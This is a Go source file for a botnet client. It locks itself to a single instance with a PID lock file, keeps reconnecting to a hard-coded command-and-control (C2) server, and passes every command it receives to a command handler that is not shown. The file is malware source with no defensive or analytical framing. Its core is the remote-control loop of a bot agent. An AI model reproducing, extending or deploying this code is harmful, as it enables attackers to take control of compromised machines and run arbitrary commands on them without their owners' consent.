package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strconv"
	"syscall"
	"time"
	"bot/cmd"
)

const (
    C2Address = "0.0.0.0:9080" // C2 server address and port
    lockFile  = "/tmp/bot.lock"
)

func main() {
    // File-based locking with PID
    if _, err := os.Stat(lockFile); err == nil {
        fmt.Println("Another instance is already running. Exiting.")
        os.Exit(1)
    }

    file, err := os.Create(lockFile)
    if err != nil {
        fmt.Println("Error creating lock file:", err)
        os.Exit(1)
    }
    defer os.Remove(lockFile)
    defer file.Close()

    // Write PID to lock file
    pid := os.Getpid()
    if _, err := file.WriteString(strconv.Itoa(pid)); err != nil {
        fmt.Println("Error writing PID to lock file:", err)
        os.Exit(1)
    }

    // Set up signal handling for graceful shutdown
    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
    go func() {
        <-sigChan
        fmt.Println("Received shutdown signal. Cleaning up...")
        os.Remove(lockFile)
        os.Exit(0)
    }()

    // Attempt to establish a connection with the C2 server
    for {
        conn, err := net.Dial("tcp", C2Address)
        if err != nil {
            fmt.Println("Error connecting to C2 server:", err)
            time.Sleep(5 * time.Second) // Retry after 5 seconds on connection error
            continue
        }
        defer conn.Close()

        fmt.Println("Connected to C2 server")

        scanner := bufio.NewScanner(conn)
        for scanner.Scan() {
            command := scanner.Text()
            fmt.Println("Received command:", command)

            if err := cmd.HandleCommand(command); err != nil {
                fmt.Println("Error handling command:", err)
            }
        }

        if err := scanner.Err(); err != nil {
            fmt.Println("Error reading from connection:", err)
        }

        time.Sleep(5 * time.Second) // Wait before attempting to reconnect
    }
}